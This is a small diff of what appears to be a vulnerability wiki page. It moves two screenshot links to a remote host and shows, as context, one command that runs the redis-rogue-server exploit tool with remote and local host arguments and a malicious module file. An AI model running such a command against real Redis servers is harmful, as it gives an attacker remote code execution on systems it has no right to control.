@@ -83,6 +83,6 @@ Example
 python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so
 ```
 
-![](image/redis-1.png)
+![](http://wikioss.peiqi.tech/vuln/redis-1.png)
 
-![](image/redis-2.png)
+![](http://wikioss.peiqi.tech/vuln/redis-2.png)
